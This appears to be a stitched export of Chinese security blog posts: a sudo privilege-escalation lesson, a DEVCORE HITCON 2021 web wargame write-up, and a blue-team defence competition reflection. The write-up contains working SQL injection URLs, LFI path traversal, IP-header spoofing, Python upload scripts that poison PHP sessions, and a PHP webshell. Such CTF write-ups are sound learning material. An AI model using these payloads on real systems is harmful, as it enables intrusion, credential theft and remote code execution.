先隨便生個檔案，並且用 sudo less 開啟檔案。 因為 less 可以用 ! 接 shell command，所以可以直接在裡頭下指令 !/bin/bash，同時由於是用 sudo 執行，所以 Enter 後就會直接拿到 root 的 /bin/bash 了。 （畫面很空，給各位看看星街的美圖） 確認取得 root 後就能去拿 /root 底下的 flag 。 MacacaHub{sudo-privilege-bf614797197ac53ee9785ee8c22a7d38} 用 python 和 perl 的道理也一樣，透過 sudo 權限執行 /bin/bash 拿到 root，如下。 $ sudo python -c \"import os; os.system('/bin/bash')\" ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:4:1","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"後記 內網滲透通常是需要好幾個技巧串起來才能夠完成，整體看下來雖然好像很單純順利，但其實很多觀念要理解也不容易，至少我光是在 SSH Tunneling 的四種連線方式摸了很久才大概看懂，所以趁這次社課把一些過程筆記下來，或許哪天不小心碰到也說不定。 ","date":"2022-04-21","objectID":"/posts/2022/nsysuisc-intranet-penetration/:5:0","tags":["NSYSUISC 中山資安社","Intranet Penetration"],"title":"[NSYSU 資安社課] Intranet Penetration","uri":"/posts/2022/nsysuisc-intranet-penetration/"},{"categories":["資訊安全 Cyber Security"],"content":"嗚嗚 好想拿 MASTER OF WEBSEC，但實力不允許我挑戰這個頭銜QQ 今年是我第二次參加 HITCON，現場活動真的是多到很難全部都摸過一遍 : D DEVCORE Wargame 活動說明: https://hackmd.io/@d3vc0r3/hitcon2021 ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:0:0","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"閒聊 這次 HITCON 2021 我除了跑完官方活動的「駭客貓歷險記」還有「駭客喵喵 \u0026 駭客貓行動」，剩下有認真摸的就是 DEVCORE Wargame，畢竟當初看到戳到 4 個 flag 的前 60 位有NFT 成就可以拿，雖然平常沒有在用這類的區塊鏈，但獎勵聽起來就很帥XD （另外中華資安的 CTF 前三名還送 OSCP 的培訓課程，但那個難度… QQ） 這次要感謝 @stavhaygn 和 @splitline 兩位願意給 hint，也感謝 @arikoi 願意聽我訴戳不出來的苦XDDD ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:1:0","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"Description 你是一名滲透測試專家，並且剛接受到一份委託，需要對一個網站進行滲透測試，測試期限至 11/27 為止。由於有時程、預算等壓力以及階段性的安排，客戶希望優先尋找 Server-Side 相關的漏洞。因此你的任務就是在時程內找出可能有風險的 Server-Side 漏洞並交出一份滲透測試報告！ 備註說明 每個弱點都是依據真實發生的案例所準備的，可以嘗試想像現代網站會如何部署、有什麼樣的架構，以此作為思維出發點。 每送出一把 flag 就會解鎖報告中的一個弱點章節，章節內有弱點細節、修補建議的範例文字，解完題後還能體驗一下實務報告樣貌的感覺唷！ 作為一名專業的 Pentester，你必須讓客戶值得信任，所以不能惡意破壞系統或是刪除、覆蓋任何非你新增的檔案、資料庫內容，造成系統無法運作。 如果違反規則，破壞系統或惡意干擾其他參加者，將會被取消所有領獎資格。 ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:2:0","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"Solution 目標網站是個影印機訂購網站，填完資料就能到訂單資訊的頁面，並且可以查看收據明細\u0026列印。而設計上總共有六個弱點可以拿到 flag，整個過程算是花費了不少時間，這篇會盡量省略不必要的遠路（絕對不是因為我忘記了），官方的滲透測試報告放在最下方供各位參考。 起手式是 @stavhaygn，他在匯出 PDF 的頁面找到有 SQLi 的漏洞，原網址如下。 http://web.ctf.devcore.tw/print.php?id=35640\u0026sig=4ufNcDscM0YTLDrd0gDyqDJCx8EPJh1kyq1ghUc6ZPztC0xmq96CPQ5vk8l2LBDi ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:3:0","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"弱點 2：Broken Access Control 這部分我原本認為訂單編號會因為驗後面那串sig而沒辦法戳 IDOR，但事實上在我們戳 SQLi 的過程，被 @stavhaygn 戳到第一筆訂單有 flag。 http://web.ctf.devcore.tw/print.php?sig=xLMBWcDpMGC1DvRD6F9l8bo1vdZU51uG4c6ZtfJaKiflyCisPZpZe0gu7OWfb88E\u0026id=3456055 union select id,name,email,phone,status,sig_hash,order_date,address,note FROM orders where id = 1 不過送出去發現官解是無效的存取控管，根本也不需要 SQLi 這麼麻煩，還真的是不小心撿到XDDD ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:3:1","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"弱點 3：SQL Injection 至於 SQLi 的戳法可以參考 NSYSU 駭客攻防 HW 0x02 Writeups ，使用 Union Select 的 SOP 大致相同這裡就不再贅述，資料庫結構如下。 web |-- items |- id |- title |- description |-- rate_limit |- ip |- last_visit |- visit_times |-- orders |- id |- name |- email |- phone |- status |- sig_hash |- order_date |- address |- note |-- options |- key |- value |-- backend_users |- id |- username |- password |- description 歐對了，別輕易拿 sqlmap 直接 --dump 硬爆資料庫，裡頭的訂單資料量會多到浪費時間 Zzzzz http://web.ctf.devcore.tw/print.php?sig=xLMBWcDpMGC1DvRD6F9l8bo1vdZU51uG4c6ZtfJaKiflyCisPZpZe0gu7OWfb88E\u0026id=3456055 union select 1,@@version,id,GROUP_CONCAT(username),5,6,GROUP_CONCAT(password),GROUP_CONCAT(description),9 FROM backend_users 從 backend_users 的 admin 拿到 flag，同時也順便拿到明文 password（怕） 另外沒想到同一招 SQLi 可以戳出兩個 flag，蠻有意思的XD ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:3:2","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"弱點 1：Path Traversal 從首頁的圖片發現後面帶有參數id，用 base64 還原後是該圖片的檔名，原網址如下。 http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc= 簡單測試後知道這邊有 LFI 的漏洞，但這部分我摸了好長一段時間，除了要多層 base64 很麻煩，另外路徑也是當通靈題在摸== 給各位看看我的 terminal 的一部分截圖（順便曬ㄍ星姐），結果其實根本不通靈，只要你懂網站，網站就會幫助你（？） 最後大致測出 root 在 ../../../../，而且官方還特地在 /etc/passwd 放了 hint 真是謝囉XD 靠著 @stavhaygn 通靈前端在 ../frontend/ ，也順勢找到了 image.php 的 source code。 \u003c?php require_once('include.php'); $id = $_GET['id']; $file = base64_urlsafe_decode($id); $file = IMAGE_PATH . $file; if (!file_exists($file)) { http_response_code(404); } else { header('Content-Type: ' . mime_content_type($file)); readfile($file); } 之後也一直都在通靈找有可能埋 flag 的路徑，還找到一些奇怪路徑（像是/usr/share/file/magic/ ），直到 @stavhaygn 問了句「你那為啥那麼客氣不拿其他 .php？」…嗯很有道理，最後還真的在 include.php 找到 flag，原來這裡才是第一關。 ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:3:3","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"弱點 4：Use of Less Trusted Source 至此， @stavhaygn 似乎也碰到瓶頸。 所以我跑去找第一名的 splitline 社工一波，得到了關鍵字 /proc/mounts，這份檔案記錄著當前系統掛載的資訊，說實在我根本不會想到要去翻這東西，有經驗的大大果然就是不一樣。 ... /dev/sda /etc/hosts ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /etc/resolv.conf ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /etc/hostname ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 /dev/sda /usr/local/etc/php/php.ini ext4 ro,relatime,errors=remount-ro,data=ordered 0 0 ... 檔案載下來可以看到在 /dev/sda 有一些常見的系統檔案，還有 @stavhaygn 通靈出來的 /usr/share/nginx/frontend ，但最讓我在意的是 /usr/share/nginx/b8ck3nd … 這後端路徑設計明顯就是不想讓你通靈吧www 直接戳 http://web.ctf.devcore.tw/b8ck3nd/index.php 發現會被 302 導回首頁，所以我決定繼續用 LFI 翻翻看後台的 source code。最後在 ../../../../b8ck3nd/include.php 找到 IP 白名單，也很明顯的是要從 /b8ck3nd/login.php 登入進後台。 \u003c?php require_once('../frontend/include.php'); session_start_once(); if (!in_array(get_client_ip(), ['127.0.0.1', '172.18.11.89'], true)) { header('Location: /'); exit(); } if (!isset($_SESSION['user_id'])) { if (!endsWith($_SERVER['SCRIPT_FILENAME'], 'login.php')) { header('Location: /b8ck3nd/login.php'); exit(); } } 下一步就是想辦法偽造 IP 戳後台頁面，最直觀的方法就是用 Burp 直接攔截封包改 header，但是嘗試一段時間雖然能摸到登入頁面，但發現效果不彰，除了找不到 Auto add parameter 的方式要一直手動複製貼上，很多時候封包送出去後網站還是繼續轉圈圈，之後改用 Google 套件 ModHeader，真的方便！ 再來後台帳號密碼，可以從 弱點 3 的 SQLi 的 backend_users 拿到，順利登入後就能直接看到 flag 了。 ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:3:4","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"弱點 5：Unrestricted File Upload 在 LFI 翻找 source code 的過程可以找到 /b8ck3nd/upload.php，原本用途應該是上傳圖片，但沒意外這裡應該是讓我們塞後門用的XD \u003c?php require_once('include.php'); if ($_SERVER['REQUEST_METHOD'] == 'GET') { header('Content-Type: text/plain'); echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkZha2UgdG9rZW4gZm9yIGNrZWRpdG9yIiwiaWF0IjoxNTE2MjM5MDIyfQ.6nNLxp10uP65V_NFrs5IWuX2tkk6vGQ-oiwYhHNdHgk'; exit(); } if (isset($_FILES['file']) \u0026\u0026 is_uploaded_file($_FILES['file']['tmp_name'])) { header('Content-Type: application/json; charset=utf-8'); $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); $filename = random_str(32).'.'.$ext; if (isset($_POST['rename'])) { $filename = $_POST['rename']; } if (isset($_POST['folder'])) { $folder = $_POST['folder']; if (!file_exists(IMAGE_PATH.$folder)) { mkdir(IMAGE_PATH.$folder); } $filename = $folder.'/'.$filename; } $filepath = IMAGE_PATH . $filename; move_uploaded_file($_FILES['file']['tmp_name'], $filepath); system(\"rsync_wrap \".escapeshellarg($filepath)); $id = base64_urlsafe_encode($filename); echo json_encode([ 'default' =\u003e '/image.php?id='.$id ]); } else { http_response_code(400); } 從 source code 可以看到若用 GET 的方式上傳會噴一串 JWT 給你，這邊直接用 python requests 上傳檔案。由於同樣會先過 include.php 的檢查，所以參數的部分該給的 IP 和 cookies 記得要放，這裡我是手動 admin 登入後再複製 cookies，想想應該有更好的寫法。 另外，從 line 15 - 23 可以發現系統允許我們自訂檔名還有上傳 folder，原本我還傻傻的想說用不到就沒注意，直到後面戳不出來，Arikoi 就問了句「如果可以上傳 folder，那你要不要試試上傳點點斜」 …… 真是好主意呢，結果只要把檔案存在非預設路徑（/images/），flag 就會自己噴出來（比想像中還快==），另外下面路徑就能透過 LFI 進行確認上傳的檔案。 （當時的 code 僅供參考） import requests url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': '\u003cPHPSESSID\u003e'} files = {'file': open('test.php', 'rb')} data = {'folder': '../tmp', 'rename': 'test.php'} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:3:5","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"弱點 6：Local File Inclusion 雖然說是這麼說，但上面的做法透過 LFI 進行確認上傳檔案會發現是 404，同時上傳到 /frontend/ 或 /b8ck3nd/ 也是一樣的情況，表示除了 /images/ 以外都不給上傳檔案（從 /proc/mounts 其實也可以看到前後端的目錄都是 read-only 不給寫檔），也難怪上一題除了噴 flag 還問了一句 Warning Now, can you get shell? 戳不到後門，那到底還有哪裡可以放檔案呢？ 這是我當時心中的疑問，從滲透測試報告的弱點 5 其實有暗示 /tmp/pwn.php，動手實驗後也確認可以上傳檔案（但不能直接存取），不過對於如何操作所謂的 “RCE” 就很陌生了。我平常 CTF 都只能戳戳簡單的小兒科，鮮少摸到複雜的 WebSec，因此對於這 RCE 整個過程是相當模糊的。 這裡我參考了兩篇文章 from RCE to LFI 的文章： 透過 LFI 引入 PHP session 檔案觸發 RCE Upgrade from LFI to RCE via PHP Sessions 其實重點在於登入後系統會在 server 端啟用 session 功能（預設路徑為 /tmp/sess_{SESSIONID} ），先隨意用一組 cookies 透過 LFI 看到內容是 lang|s:5:\"zh-tw\";user_id|s:1:\"1\";，根據上面第二篇的說法，可以嘗試從 lang 下手。 回頭看看 /frontend/include.php，可以發現似乎在 session 有些線索可循，包括預設會透過 require_once 引入 langs/zh-tw.php，不過載下來是個空檔案，當時我的思路卡在這裡， @stavhaygn 還打趣的表示「官方感覺就是故意引導你，告訴你這裡怪怪的ㄡ」。 ... define('DEFAULT_LANGUAGE', 'zh-tw'); define('ALLOWED_LANGUAGE', 'zh-tw'); function session_start_once() { if (!isset($_SESSION)) { session_start(); } } session_start_once(); if (!isset($_SESSION['lang'])) { $_SESSION['lang'] = DEFAULT_LANGUAGE; } require_once('langs/' . $_SESSION['lang'] . '.php'); ... 這裡我大概陷入約 2 小時的撞牆期，因為沒搞懂 RCE 後門的操作方式，所以一直想把 webshell 塞到 /tmp/sess_{SESSIONID}，然後再透過 LFI 主動去執行後門，最後證明想法接近但使用後門的方式不對。 整理之後思路大致如下，由於每一次請求都會先執行 require_once('include.php');，而 language 會根據 session 決定要載入哪個 langs/ 的 PHP 檔，若能夠利用這個\"載入 PHP\"的漏洞把 zh-tw.php 換成 shell.php 之類的，就能執行程式達成我們要的 RCE 。 但該怎麼做呢？ 我想這部分可以分成 上傳後門 和 使用後門 ，而這兩部分都會透過 upload.php 操作。 (1) 上傳後門 code 其實都差不多，後門的上傳位置我放在伺服器的 /tmp/cyris.php，只要能戳到就好。 （本機端 test.php 的內容可以先放個 \u003c?php system(\"ls -al\"); ?\u003e 或 \u003c?php phpinfo(); ?\u003e 方便確定結果） import requests cookie = '\u003cPHPSESSID\u003e' url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': cookie} files = {'file': open('test.php', 'rb')} data = {'folder': '../../../../../../tmp', 'rename': 'cyris.php'} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) P.S. 很想用 cyris.php 在 DEVCORE 機器內留名的我 (2) 使用後門 有了後門，那就要想辦法觸發！ 這裡我們自己寫個 sesseion 檔案把伺服器內的 /tmp/sess_{SESSIONID} 覆寫成我們的形狀w，內容大概像這樣 lang|s:27:\"../../../../../../tmp/cyris\";user_id|s:1:\"1\"; 注意除了格式要對，也要是能戳到後門的路徑。 import requests cookie = '\u003cPHPSESSID\u003e' url = 'http://web.ctf.devcore.tw/b8ck3nd/upload.php' headers = {'X-Forwarded-For': '172.18.11.89'} cookies = {'PHPSESSID': cookie} files = {'file': open('session', 'rb')} data = {'folder': '../../../../../../tmp', 'rename': 'sess_'+cookie} r = requests.post(url, headers=headers, cookies=cookies, files=files, data=data) print(r.status_code) print(r.text) 沒意外直接 LFI 就能看到結果。 之後就能一路透過後門找 flag，可以用 \u003c?php system($_GET['cmd']); ?\u003e 就可以直接用 GET 下指令，例如： http://web.ctf.devcore.tw/image.php?id=\u003cfilepath_base64\u003e\u0026cmd=../../../../readflag2 看起來寫得很精簡，但這部分花掉了我整個晚上的時間，尤其蓋 session 一直蓋爛，然後經驗太少又沒有 debug 方向，感謝 @stavhaygn 耐心的指引，後面燒掉好多腦細胞QwQ 之後用 RCE 跑去翻 /tmp/，除了 session 還有很多其他人遺留的後門，我也留名做個紀念（順便清掉自己留的一堆爛掉ㄉ測試檔）XDDD ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:3:6","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"後記 不得不說這種用 flag 逐步解鎖滲透報告的想法，個人覺得很棒。而且整個過程也都有脈絡可循，只是經驗不夠還是很容易像我通靈亂戳，要需要找人求救 QQ。在會場和 DEVCORE 交流時得知其實題目整組就是 RCE 的連續技，只是在滲透的過程中會撿到 Flag，很喜歡這種學技術的感覺，只是若要自己重現系統環境感覺不容易，不然放到自架的 CTFd 感覺應該很不錯。 此外就是體會到 LFI 的嚴重性，過去打 CTF 都只覺得危險程度在機敏資料外洩，沒想到搭配 PHP Sessions 可以做出 RCE ，直接把手伸進系統內真的好可怕\u003e\"\u003c 最後附上官方用心製作的滲透測試報告XD ","date":"2021-12-01","objectID":"/posts/2021/hitcon2021-devcore-web-challenge/:4:0","tags":["HITCON","DEVCORE Wargame","Penetration Test"],"title":"[DEVCORE @HITCON2021] Wargame Web Challenge","uri":"/posts/2021/hitcon2021-devcore-web-challenge/"},{"categories":["資訊安全 Cyber Security"],"content":"住手！ 不要再把我們的機器關機 LAAAAAAAAAAAAAAAA TL;DR 這篇的出現除了是我們被打得慘兮兮需要檢討，也是因為賽前幾乎找不到什麼資訊，想想那就寫點心得。 如果你希望能從這篇瞭解我們的藍隊策略，很抱歉沒有 : ( 整體活動的時程規劃相當緊湊，從 10/01 收到活動消息，轉眼不到一個月就結束了。 HITCON Defense 至今已經是第三屆了，但給學生的 Education（教育場）是首屆舉辦，因此我很慶幸能在所剩不多的學生時間參加這場活動，平常都是以 CTF 練習居多，鮮少有機會可以擔任藍隊角色，但也因此幾乎是 0 防禦經驗的菜鳥，所知道的防禦都從教科書或是課堂聽過，沒有實際實踐的機會。 ","date":"2021-11-01","objectID":"/posts/2021/hitcon-education-defense-2021/:0:0","tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/posts/2021/hitcon-education-defense-2021/"},{"categories":["資訊安全 Cyber Security"],"content":"教育訓練 主辦單位還為活動舉辦賽前教育訓練 workshop，收到議程內容感覺就是滿滿的工商時間，結果到現場聽課還真的是教你使用資安產品，而且到場的學生並不多，大部分都是金融業資安人員和企業主管，報到的時候看到各種頭銜都有（怕.jpg），報名活動前還以為防禦只要寫些 iptable 規則實在是太天真了。 DAY 1，主要教 Palo Alto Network 的 3220防火牆（簡稱 PA）和 Cortex XDR 兩種產品，老實說孤陋寡聞的我沒什麼聽過，賽後交流才知道在業界算是常見的資安企業，或是臺灣比較常聽到… ZYXEL？ 而整天的課程都是以 Lab 為主，雖然能照著 Guide 操作，但是要短時間內上手真的困難，何況平常習慣用 CLI 打打指令使用工具，突然間要用滿滿功能的產品老實說有些不知所措XDDD DAY 2，下午場講 Citrix WAF，原本看議程寫 OWASP 想說大概又是老生常談，結果課程意外精實，講師從紅隊的攻擊思路開始介紹，還給了很多有趣的業界題外話，甚至是要我們（學生）看看在座其他企業的藍隊苦主，再好好思考要不要入資安產業。而且也聽講師說往年的藍隊都很淒慘，到後面都在比\"看誰比較沒那麼慘\"，不過當年各隊還能交換情報互相協助，今年似乎因應疫情各隊要關在小房間不能交流，可能會更慘QQ 讓我意外的是，這場教育訓練掛著 HITCON 頭銜卻沒看到任何熟面孔，結果競賽當天不意外大神們全都在對面擔任紅隊 / Infra。另外教育場並沒有安排\"採購部門\"讓我們花點數採買額外的資安產品，因此教育訓練介紹的三項資安產品只剩下 PA 可以用，但我摸不到三小時實在是上手困難，當下連要把流量存成 PCAP 檔的選項都找不到XDDDD ","date":"2021-11-01","objectID":"/posts/2021/hitcon-education-defense-2021/:1:0","tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/posts/2021/hitcon-education-defense-2021/"},{"categories":["資訊安全 Cyber Security"],"content":"競賽前夜 Cyris－南部某狀況外ㄉ藍隊苦主 我們藍隊連自家所要負責保護的服務都不了解，說不定問隔壁紅隊還比我們清楚(/ =ω=)/ 結論：與其熬夜惡補，不如早點睡還比較有用 仔細想想，藍隊競賽真的是“團體戰”，不像平常打 CTF 都是各自挑題目的獨立行動，何況事前完全沒有任何資訊，所以想想還是開會討論一下戰術。 這部分我們開了共筆列出前期需要收集的系統資訊，以及基本的更改帳密、檢查對外 PORT、是否被建排程、更新服務等。聽說有 web server 那就要考慮 IDOR、XSS 等漏洞怎麼防禦，甚至擔心會不會被近期的 Apache CVE 打穿。另外，AD 本來就是預期的考點，因此也聊了像是檢查 DC 設定、 GPO 怎麼操作、SMB 該不該關掉 … 嗯對，這次有 service checker 的安排，所以服務並不能說關就關，我們討論一些可能 check 的方式，像如果 BAN 掉紅隊 IP，可能所有服務都沒辦法 checked，那就很頭疼了 XD 回頭想想，其實一些思路在競賽時方向都正確，只是我們找不到 / 不會用 / 不懂看 / 判斷錯誤，最後現場手忙腳亂後都沒辦法進入狀況，有些可惜。 ","date":"2021-11-01","objectID":"/posts/2021/hitcon-education-defense-2021/:2:0","tags":["HITCON Defense","AIS3"],"title":"[Sharing] HITCON Education Defense 2021","uri":"/posts/2021/hitcon-education-defense-2021/"},{"categories":["資訊安全 Cyber Security"],"content":"競賽當日 活動總共有三天，分別是 競賽暖身(Day 1)、教育場(Day 2)、企業場(Day 3)，我們只出席 Day 2 的部分。而我們負責防禦的服務一共六項，並且每分鐘根據 service check 進行加分： [30 pts] WordPress [25 pts] DNS [15 pts] VPN Server (OpenVPN) [15 pts] BugNet (IIS) (via VPN) [10 pts] Nagios (Dashboard) [05 pts] Windows 10 VDI (accessed via VPN) 蠻意外居然有故事設定，不得不少很用心，而且還真的是空降的藍隊苦主哭啊wwwww 下圖是各隊伍的 Service Status Dashboard，後期有發生 VPN Down 會讓連帶 VDI 跟 IIS 一起 Down 的問題，即便如此還可以發現我們 Team 2 的服務狀況到後面幾乎是一振不起，除了不熟環境找不到問題解決，重點我們不會開機（等等會提）。 另外，主辦單位還提供 CTFd 以問答的方式來定時提示各服務的狀況，不得不說真的是非常棒的引導方式，有幾個洞還真的是看題目才知道有被埋後門，但能不能找到又是另一回事（默），題目如下，僅供參考： [0] 公開網段在哪？ AC [0] 機器盤點 [0] 清點開啟的Port AC [60] WordPress 使用者清點 WA [60] IIS Local Admin AC [60] VPN 用什麼架的 AC [120] AD-Domain 使用者盤點 AC [120] 找出 Domain Admin AC [180] 前員工遺留的不明 SSH Key AC [180] T1550.002 Pass the Hah [180] IIS Module Backdoor [180] Windows 後門服務 [240] .NET Machine Key [240] IIS Webshell [240] 請找出攻擊者所用之 C2 Domain [240] AD CS 找出後門憑證 [300] check_load 後門 [300] C2 in blogspot [300] NGINX 後門 計分板 ; w ; 總之，我們還是整個被打歪，服務到後面全掛QwQ 那下面就邊檢討邊聊聊我們發生的事吧 : ) 1. 盤點設備 隊伍成員一致認為失分的最大問題，雖然前夜還在說要收集資訊，但開場忙著改機器密碼就忽略了設備盤點。作為空降的藍隊苦主，應該要先檢查 infra 和服務環境，然後 11:00 前跟 IT 部門確認，因為在那之後 … XD 主辦單位準備的 infra 雖然有提供 vSphere 和 ESXi，但由於有基礎建設回復的選項，所以我們下意識認為沒辦法摸到那六台機器（可能只能管理 infra），但後期看到其他隊伍在 Services Status Dashboard 居然能反覆在 Down 和 Up 閃現，賽後交流才知道是重開大法，因為我們其實不僅能操作六台機器，還能直接 snapshot 備份虛擬機，想到賽中討論還很掙扎地花 1000 分請 IT 人員 rollback，真的差點哭出來QwQ 2. 基本檢查/漏洞檢測/弱點掃描 一些系統檔案如 .bashrc、.history、排程等是否有可能被駭客利用，賽後交流也有聽到系統內的 iptable 是假的w 不應該存在的目錄，本次事件似乎有後門放在 /test/。 （其實上述兩點我也不太確定有什麼系統檔案是非檢查不可，太多了QQ） 非必要的服務 / Port 關閉，雖然是這麼說，不過隊友所負責的 WordPress 前期設定完成後就把 plugin 全砍了，賽後交流才發現真是梁O茹給的勇氣，因為沒辦法被 service checker 確認，所以服務一直是維持 Down，正確做法應該是先停用（disable），或是用資安工具下 policy 保護。 3. 更新前備份 雖然知道許多企業不敢 更新(update) / 升級(upgrade) 就是怕服務掛掉，這次就是因為升級 WordPress 的套件導致資料庫爛去，真的是血淋淋的案例XD 因此在更新前備份是相當重要的事，而且還必須確認是\"有效\"的備份，備份也因為空間問題有不同形式，這部分可以去翻翻 Wikipedia。 題外話，賽後交流才意識到，如果是 APT 攻擊，駭客會潛伏好一陣子做資訊收集，同時會事先確認企業所有的備份的方式、路徑，等發動攻擊時再一併刪除或加密。一般隨意投放的勒索軟體或惡意程式，只會走固定的模式，針對特定檔案操作而已。此外，若駭客有意破壞，除了刪除和備份，更狠的放爛掉的備份，讓你以為有正常無缺的備份。 4. 帳號管理 這次有幾題是以離職員工作為場景，可以預想駭客會從離職員工的帳號進入，甚至離職員工=駭客。除了直接移除帳號，修改密碼這部分我們倒是做得很勤奮，但後來賽後交流有聽到案例是駭客在改密碼前就在系統內了，哭啊。此外檢查憑證是否過期，在本次事件 @stavhaygn 有找到離職員工的 SSH 公鑰，幸好有備份下來，因為後來 CTFd 還真的有題目問XD 我也是這次才注意到原來每個家目錄底下都有屬於自己的 .ssh/.authorized_key，若要全面盤查可能要寫 script 會比較方便。 5. Windows AD 主要的考點，同時是許多企業的網路架構，也是本次紅隊大部分的入侵點。 這次要負責防禦的服務幾乎都在 AD 底下，不過我對 AD 真的不熟，只從網路上知道要檢查權限、GPO 設定。不過隊友原本要設定防火牆擋 SMB，結果駭客有埋 script 會自動關防火牆，所以最後根本沒開到== （其他細項我還在啃資料QQ 有想法會再補充） 而紅隊的其中一項攻擊是讓服務倒數時間後關機，而 DC 被關就相當於 AD 陣亡，原本我們還在抱怨關機太狠，殊不知根本可以從 vSphere 和 ESXi 開機，聽其他隊伍還會直接硬幹用 script shutdown -a 無限迴圈來取消關機ww 而且紅隊似乎放水很多，聽企業場甚至會直接砍資料庫有夠可怕，相比之下我們學生場真的很友善(?)。 在 AD 第一次被關機後，我們討論了很久決定電話打專線求助紅隊，試圖打聽一點可用資訊，結果什麼都沒有嗚嗚，畫面很卡不用你們說我也知道被駭客打了QQ。最後花 1000 點把 AD rollback，想說雖然可能會被相同的套路打到關機，但至少要開機摸點什麼回去。 有趣的是現場有準備一台 PC 用來模擬辦公室電腦，同樣也是在 AD 底下，因此聽到許多紅隊都從 PC 滲透，還擅自安裝了一些如 Anydesk、Steam、楓之谷、原神等等的軟體笑死，隔壁組還被拿來播瑞克搖。賽後交流紅隊表示他們透過 PC 甚至可以進隊伍的 infra 修改防火牆設定，太可怕了吧。 賽後和其他藍隊聊了一下，大多是從實習時期接觸 AD 和 PA，不然學生平常要遇到還真不容易（汗）。 6. 擅用工具 以往我對防毒軟體的印象大概就是 Windows Defender 這種一鍵開關，防火牆功能也是列黑/白名單，所以在教育訓練的時候真的是大開眼界www 真的有介面但我還是不會操作。賽中我也算是蠻中期才開始碰 PA，原本還想一則則看懂裡頭預設的規則，後面才想到教育訓練第一步教要去 Network 把 interface “Bring up”，然後就… 下去了（時間 12:50 左右），後來是 @stavhaygn 注意到不對勁我才關掉，總之看起來不熟的軟體還是不要亂用 Orz 賽後才曉得被 infra 偷埋 uncommit 的炸彈，不少隊都有踩到XDDDD 對面還特地做梗圖，笑死。 最後在交流的時候，話題大部分也都圍繞在 PA，畢竟 AD 一開始就是暴露在外網，若沒辦法在將 AD 拉進 PA 底下幾乎就是只有被打的份。 其他工具要說填坑也怪怪的，畢竟平常碰不到，除了是付費的專門工具，手邊也沒有 online side project 的規模大到需要靠資安工具保護，只能簡單列出來等哪天會用到吧 : 3 Palo Alto Network (PA-3220) Cortex 